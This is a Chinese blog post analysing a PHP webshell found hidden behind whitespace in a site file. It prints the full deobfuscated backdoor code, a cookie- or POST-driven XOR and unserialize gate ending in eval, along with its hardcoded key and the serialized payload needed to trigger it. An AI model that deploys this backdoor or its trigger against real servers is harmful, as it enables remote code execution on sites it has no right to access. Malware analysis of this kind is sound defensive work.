\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s?\_\_biz=MzAxMzg4NDg1NA==&mid=2247484029&idx=1&sn=06bfd2fb382364e1572ae391d8c8be4a&chksm=9b9a8ea4aced07b2ca61b33b68f74ad2e28cf27848940d89362389eb6bac977927d99ecd6603&mpshare=1&scene=1&srcid=1013LQRZPJylbVZtyUZAR7hf&sharer\_sharetime=1602633065793&sharer\_shareid=c051b65ce1b8b68c6869c6345bc45da1&key=d1b2c53fcb9e77ee70f6bc50307d73985f16d8e7dc67df821afad8e8e352c4872bcef19c49762ad4e3d0043a4d8384ae74a2efc37016e2fc4c059fe1b02275af41a4f3af160b53db0ca284e54194fdf0602e35d043b97a114f7ab9c6e77f72485322fc2ee2ff304bf6a703b208e4ed3e22498ec2e678bcfb917f9333e5ba1788&ascene=1&uin=ODk4MDE0MDEy&devicetype=Windows+10+x64&version=6300002f&lang=zh\_CN&exportkey=Adxht5bRTRLY%2BqteXmOIwbs%3D&pass\_ticket=5iBkjjQtfbEoCMU4%2BnfhOAJi%2FVJ%2BFty3yCm8kFn8GVUk3mWzBKMJBjfoyOfZ%2B5pr&wx\_header=0)

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqczeflvHvDexuf2BhBEBYlJCdjJS6aVZ0w6ooY5QwK27L2khaJWEOVdw2kunkBTviakCv6QeGxYjHg/640?wx_fmt=png)

最近遇到个文件，打开一看只有几行注释？看了下字节数却很大，横向进度条很长啊，通过 web 访问是空白，看上去应该是藏了后门了。  
    ps: 这种方式遇到粗心 / 没有经验的管理员可能混过去，但若使用 win 自带的记事本 (需开启自动换行) 则一览无余。  

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqeDqP3Ocd1EMFZfpjCB7XRbiaqWibtvftYwtZODR0VC7KHqsQjoz6gW7EBGjl3ibVlDsPR9gO4aOlrMw/640?wx_fmt=png)  
实际上换行整理一下：

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqeDqP3Ocd1EMFZfpjCB7XRbB4zhlibSHpyEyQiadiareMOvG5G2eMombRa5OTicXw64gYodFlgWJTsE0g/640?wx_fmt=png)

  
用 Notepad++ 自带的正则替换简单做了下格式处理。

  
另外在下面的代码中发现了 **eval/\*r49557ec\*/(**  

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqeDqP3Ocd1EMFZfpjCB7XRbwm2hVs3VobcrNibzBeGLjV65tHIJlRz2BT9CjeaF5uMhTzysibibhL2Tw/640?wx_fmt=png)  
  还插了注释，这个小方法很有意思，测试了下函数与 "(" 中间插注释确实不影响执行。  
  但实际我测试用类似的注释方式填充敏感函数，过不了 D 盾。  
**一. 还原庐山真面目**  
**在进行替换 / 整理 / 和谐部分变量名之后，得到如下完整后门代码 (整理后代码)：**

```
<?php
$da59aa5 = 208;
$GLOBALS\['w8fd00d8'\] = Array();
global $w8fd00d8;
$w8fd00d8 = $GLOBALS;
${"\\x47\\x4c\\x4fB\\x41\\x4c\\x53"}\['a904'\] = "\\x2f\\x25\\x32\\x54\\x75\\x3a\\x5e\\x36\\x31\\x48\\x21\\x5b\\x30\\x66\\x20\\x5f\\x56\\x5a\\x4d\\x23\\x3e\\x37\\x71\\x29\\x26\\x2c\\x68\\x7e\\x5c\\x9\\x64\\x69\\x6e\\x3c\\x6b\\x2b\\x61\\x2d\\x4a\\x47\\x42\\x7c\\xa\\x6a\\x7b\\x6f\\x52\\x27\\x4c\\x39\\x55\\x63\\x4b\\x7a\\x49\\x3f\\x5d\\x76\\x33\\x59\\x43\\x62\\x24\\x38\\x79\\x70\\x72\\x67\\x28\\x35\\x46\\x3d\\x7d\\x65\\x57\\x41\\x53\\x44\\x73\\x60\\x58\\x34\\x77\\x22\\x6c\\x6d\\x4e\\x45\\x4f\\x40\\x78\\x74\\x50\\xd\\x2a\\x2e\\x3b\\x51";
@ini\_set('error\_log', NULL);
@ini\_set('log\_errors', 0);
@ini\_set('max\_execution\_time', 0);
@set\_time\_limit(0);
if (!defined('ALREADY\_RUN\_366afb8a8a2355ab21fbf11ba1a02fba')){
        define('ALREADY\_RUN\_366afb8a8a2355ab21fbf11ba1a02fba', 1);
        $vv = NULL;
        $kk = NULL;
        $w8fd00d8\['c77700426'\] = 'aec7e489-2fbc-4b15-871f-1d686eeb80dc';
        global $c77700426;
        function  e664fd($vv, $kk){
        global $w8fd00d8;
        $n513761 = "";
        for ($i=0;$i<strlen($vv);){
                for ($p=0;$p<strlen($kk) && $i<strlen($vv);$p++, $i++){
                        $n513761 .= chr(ord($vv\[$i\]) ^ ord($kk\[$p\]));
                }
        }
        return $n513761;
        }

        function  x184f5cc($vv, $kk){
                global $w8fd00d8;
                global $c77700426;
                return e664fd(e664fd($vv, $c77700426), $kk);
        }

        foreach ($\_COOKIE as $k=>$v){
        $vv = $v;
        $kk = $k;
        }

        if (!$vv){
                foreach ($\_POST as $k=>$v){
                $vv = $v;
                $kk = $k;
                }
        }

        $vv = @unserialize(x184f5cc(base64\_decode($vv), $kk));

        if (isset($vv\['a'.'k'\]) && $c77700426==$vv\['a'.'k'\]){
                if ($vv\['a'\] == 'i'){
                        $l71c40 = Array('p'.'v' => @phpversion(),'s'.'v' => '1'.'.'.'0'.'-'.'1',);
                        echo @serialize($l71c40);
                }
                elseif ($vv\['a'\] == 'e'){
                eval/\*r49557ec\*/($vv\['d'\]);
                }
                }
                exit();
        }

?>
```

> 1\. 调试出各种已定义变量的值  
> 2\. 替换字变量 / 函数名，增加可读性  
> 3\. 通过倒序的方式，逐步尝试调用后门，明确调用逻辑。

**首先前面几行：**  

```
$GLOBALS\['w8fd00d8'\] = Array();  //定义全局数组，用于保存后面的各种函数名/字符串，以及直接作为函数执行 ，如$GLOBALS\['xx'\]()
global $w8fd00d8;
$w8fd00d8 = $GLOBALS; 
//这里有一个发现，如果变量是被$GLOBALS赋值，那么此变量也会随着$GLOBALS的值实时更新
```

```
$test = $GLOBALS;
访问：?handsome=t00ls
$test值也有handsome=t00ls
```

**如：**

```
${
"\\x47\\x4c\\x4fB\\x41\\x4c\\x53"}\['a904'\] = "\\x2f\\x25\\x32\\x54\\x75\\x3a\\x5e\\x36\\x31\\x48\\x21\\x5b\\x30\\x66\\x20\\x5f\\x56\\x5a\\x4d\\x23\\x3e\\x37\\x71\\x29\\x26\\x2c\\x68\\x7e\\x5c\\x9\\x64\\x69\\x6e\\x3c\\x6b\\x2b\\x61\\x2d\\x4a\\x47\\x42\\x7c\\xa\\x6a\\x7b\\x6f\\x52\\x27\\x4c\\x39\\x55\\x63\\x4b\\x7a\\x49\\x3f\\x5d\\x76\\x33\\x59\\x43\\x62\\x24\\x38\\x79\\x70\\x72\\x67\\x28\\x35\\x46\\x3d\\x7d\\x65\\x57\\x41\\x53\\x44\\x73\\x60\\x58\\x34\\x77\\x22\\x6c\\x6d\\x4e\\x45\\x4f\\x40\\x78\\x74\\x50\\xd\\x2a\\x2e\\x3b\\x51";
```

这个特性我查了半天资料，没有找到原因。  
下面：  

```
脚本所有已定义变量：
            \[a904\] => /%2Tu:^61H!\[0f \_VZM#>7q)&,h~\\        din chr
            \[z2d33f00\] => ord
            \[v618c417c\] => define
            \[hb67d10\] => strlen
            \[r018ad5\] => defined
            \[x8a4\] => ini\_set
            \[n2eb\] => serialize
            \[be64\] => phpversion
            \[f8d94b\] => unserialize
            \[kdd72d\] => base64\_decode
            \[k23b\] => set\_time\_limit
            \[s6f48\] => x184f5cc
            \[jf1ef40\] => e664fd
            \[c68905ea\] => Array
```

```
eval/\*r49557ec\*/($vv\['d'\]);
```

```
$vv = @unserialize(x184f5cc(base64\_decode($vv), $kk));
```

由于是 16 进制，在单引号包裹的情况下也可以使用 chr(hexdec(字符串)) 进行解码。

```
if (isset($vv\['a'.'k'\]) && $c77700426==$vv\['a'.'k'\]){
                if ($vv\['a'\] == 'i'){
                        $l71c40 = Array('p'.'v' => @phpversion(),'s'.'v' => '1'.'.'.'0'.'-'.'1',);
                        echo @serialize($l71c40);
                }
                elseif ($vv\['a'\] == 'e'){
                eval/\*r49557ec\*/($vv\['d'\]);
                }
                }
                exit();
```

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqeDqP3Ocd1EMFZfpjCB7XRbogsIP072ciaQWFyiaNIQSjsBvb2utYvVMCaG2FtnpaicNQsGR8iaFCiaVxw/640?wx_fmt=png)

```
array(
'ak'=>'aec7e489-2fbc-4b15-871f-1d686eeb80dc',
'a'=>'e',
'd'=>'执行代码' //如phpinfo();
);.
```

```
$vv = @unserialize(x184f5cc(base64\_decode($vv), $kk));
```

```
x184f5cc(base64\_decode($vv), $kk) 返回值需要等于 a:3:{s:2:"ak";s:36:"aec7e489-2fbc-4b15-871f-1d686eeb80dc";s:1:"a";s:1:"e";s:1:"d";s:10:"phpinfo();";}
```

> 敏感函数 unserialize // 可能需要反序列化操作

>   
> 
>   其中下标 \[a904\] 的值由于存在特殊字符，没有显示完全，另外如需利用到 \[a904\] 的值也要考虑这个问题，不能直接输出使用。

**二. 触发条件分析**  
当时按顺序读了下功能，事后复盘发现，可能比较高效的做法是倒序着读，顺着最下面的执行逻辑往上去构造条件。  
所以既然重点在  

```
function  x184f5cc($vv, $kk){
                global $w8fd00d8;  
                global $c77700426;
                return e664fd(e664fd($vv, $c77700426), $kk);
        }
```

那设法 $vv\['d'\] 可控就好

```
a:3:{s:2:"ak";s:36:"aec7e489-2fbc-4b15-871f-1d686eeb80dc";s:1:"a";s:1:"e";s:1:"d";s:10:"phpinfo();";}
```

```
function  e664fd($vv, $kk){
        global $w8fd00d8;
        $n513761 = "";
        for ($i=0;$i<strlen($vv);){
                for ($p=0;$p<strlen($kk) && $i<strlen($vv);$p++, $i++){
                        $n513761 .= chr(ord($vv\[$i\]) ^ ord($kk\[$p\]));
                }
        }
        return $n513761;
        }
```

可以先不考虑 x184f5cc(base64\_decode($vv), $kk) 是怎么来的，

我们先直接修改 $vv 的值，看怎样才能满足执行条件。  

```
e664fd(e664fd($vv, $c77700426), $kk);
```

**后门触发条件：**  
**1.$vv 需要是数组**  
**2\. 成员必须存在'ak'且'ak'需等于 $c77700426 的值**  
        $c77700426 的值在上面已有定义：

        为'aec7e489-2fbc-4b15-871f-1d686eeb80dc';  
**3\. 成员需存在'a'，若值为'i'则输出版本，为'e'则触发后门  
4\. 后门执行内容为成员'd'的值**  
所以 $vv 需要等于↓↓

```
a:3:{s:2:"ak";s:36:"aec7e489-2fbc-4b15-871f-1d686eeb80dc";s:1:"a";s:1:"e";s:1:"d";s:10:"phpinfo();";}
```

直接传入试试有没有问题 ：  

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqeDqP3Ocd1EMFZfpjCB7XRbmnjPJtaBic6ORvyewribz8LTl69DMuJRkV4aDyUMoua9XvWlBBCUpvvw/640?wx_fmt=png)

  
可以执行，回到上面：  

```
a:3:{s:2:"ak";s:36:"aec7e489-2fbc-4b15-871f-1d686eeb80dc";s:1:"a";s:1:"e";s:1:"d";s:10:"phpinfo();";}
```

```
       foreach ($\_COOKIE as $k=>$v){
        $vv = $v;
        $kk = $k;
        }

        if (!$vv){
                foreach ($\_POST as $k=>$v){
                $vv = $v;
                $kk = $k;
                }
        }
```

```
e664fd(e664fd($vv, $c77700426), $kk);
```

看下 x184f5cc() 函数做了什么操作？  

```
e664fd($vv, $c77700426) //$c77700426 = 'aec7e489-2fbc-4b15-871f-1d686eeb80dc'
```

```
e664fd(第一次的返回值, $kk);
```

```
a:3:{s:2:"ak";s:36:"aec7e489-2fbc-4b15-871f-1d686eeb80dc";s:1:"a";s:1:"e";s:1:"d";s:10:"phpinfo();";}
```

```
$vv = @unserialize(x184f5cc(base64\_decode($vv), $kk));
```

大致功能就是把传入的两个参数值逐个字符转为 ASCII 码并进行位运算 (取反)，得到的结果以字符串形式返回。

```
位取反有个特点：
```

 **1.A 与 B 取反 = C  
    2.B 与 C 取反 = A  
       可逆，B^C 当然就得到 A 了。**

  
所以回过头看：  

我们必须使函数↓↓  

```
e664fd(e664fd($vv, $c77700426), $kk);
```

的返回结果为 ↓↓  

```
a:3:{s:2:"ak";s:36:"aec7e489-2fbc-4b15-871f-1d686eeb80dc";s:1:"a";s:1:"e";s:1:"d";s:10:"phpinfo();";}
```

也就是我们需要在第二次我们必须使 e664fd() 时候，

让 e664fd($vv, $c77700426) 与 $kk 的取反结果等于↓↓  

```
a:3:{s:2:"ak";s:36:"aec7e489-2fbc-4b15-871f-1d686eeb80dc";s:1:"a";s:1:"e";s:1:"d";s:10:"phpinfo();";}
```

```
于是需要看看$kk的值是如何过来的，
```

```
       foreach ($\_COOKIE as $k=>$v){
        $vv = $v;
        $kk = $k;
        }
        if (!$vv){
                foreach ($\_POST as $k=>$v){
                $vv = $v;
                $kk = $k;
                }
        }
```

发现 $kk/$vv 前后没有做什么验证，代码就是就是比较单纯的获取 COOKIE 或 POST 提交过来的参数名和参数值并传给 $kk/$vv  
我们通过 cookie 提交来验证一下是否正常输出：

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqeDqP3Ocd1EMFZfpjCB7XRbKFIzjdabIyj3ZiarngdQOu291pRMickvkKRTJhgFWeTZ8TlbWmu4c7jg/640?wx_fmt=png)  
**没问题！**  
**三. 确定爆菊思路**  
然后我们大致确定下构造的思路：

```
e664fd(e664fd($vv, $c77700426), $kk);
```

第一次 e664fd() 执行时：

```
e664fd($vv, $c77700426) //$c77700426 = 'aec7e489-2fbc-4b15-871f-1d686eeb80dc'
```

需返回能与第二次 e664fd()  
cookie 参数名取反结果  
为 a:3:{s:2:"ak";s:36:"aec7e489-2fbc-4b15-871f-1d686eeb80dc";s:1:"  
...... 的值  
  
第二次 e664fd() 执行时：  

```
e664fd(第一次的返回值, $kk);
```

// 需返回  

```
a:3:{s:2:"ak";s:36:"aec7e489-2fbc-4b15-871f-1d686eeb80dc";s:1:"a";s:1:"e";s:1:"d";s:10:"phpinfo();";}
```

```
所以构造思路如下：
```

> (('aec7e489-2fbc-4b15-871f-1d686eeb80dc' ^ cookie 值) ^ cookie 参数名) = a:3:{s:2:"ak";s:36:"aec7e489-2fbc-4b15-871f-1d686eeb80dc";s:1:"a";s:1:"e";s:1:"d";s:10:"phpinfo();";}
> 
>   

按照这个逻辑进行参数提交，方可触发后门。  

  但 COOKIE/POST 中参数名对特殊字符支持有限，所以 $kk(参数名) 的值最好在字母 / 数字范围内，好在 $vv(参数值) 的值就宽容的多，尤其是由于 $vv 传递过程需要 Base64 解码，所以，cookie 值需 base64 编码，可以取反的字符范围就比较大了。  

```
$vv = @unserialize(x184f5cc(base64\_decode($vv), $kk));
```

我们先把 $kk 也就是 cookie 参数名的字符固定一下，比如就叫'tttttttttttttttttttttttttttttttttttttt.....'  

(也可以是任意字符 cookie 参数名允许即可)

具体长度取决于我们的 payload 序列化后的字符长度 (phpinfo() 的序列化  

后长度是 101 个字符)，两者长度要一致。  

  
**四. 写个 Payload 脚本**  
**我们写个脚本：**  
大致实现通过传参生成任意执行代码的 payload，如果要更懒的话可以直接写提交过去。

  
**Payload 代码：**  

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqeDqP3Ocd1EMFZfpjCB7XRbXiaLC7ia4EreCmSa1Fl6JqEIPCk6Ly6Zvt689LchiaibGOBAv5flT1ibCaA/640?wx_fmt=png)

  
**生成结果：**

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqeDqP3Ocd1EMFZfpjCB7XRbibibvKh6OvG4e3p26DFE1T68dSlEZfGtc2agL30vWYpCrKu61EhdAsJw/640?wx_fmt=png)

  
**执行结果：**  

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqeDqP3Ocd1EMFZfpjCB7XRbIOvvrQ1JpicicicdWNwomoBnbZ1xksyvsYHic3kJBVeicnJaiaX9VFDkU1Rw/640?wx_fmt=png)

**总结**  
       1. 心静下来比较难，一旦静下来面对很多问题都能解决。  
        2. 自知没有多少技术含量，都是很基础的东西。希望谅解！  
        3. 感谢 AdminTony 这段时间对我学习技术的帮助！  

**问题：**  

        为何我测试许久发现提交的命令只要大于 11 个字符就报错，应该不是 cookie 参数名长度问题，希望有兄弟解答！

![](https://mmbiz.qpic.cn/mmbiz_jpg/RpxgdDjibJqeDqP3Ocd1EMFZfpjCB7XRbZVpFDI4JUp1F1bgrXTKDArvZAFjdn10lOYAFahXGDrzKoWG2CGnoWg/640?wx_fmt=jpeg)

**联系微信**

**END.**

**欢迎转发~**

**欢迎关注~**

**欢迎点赞~**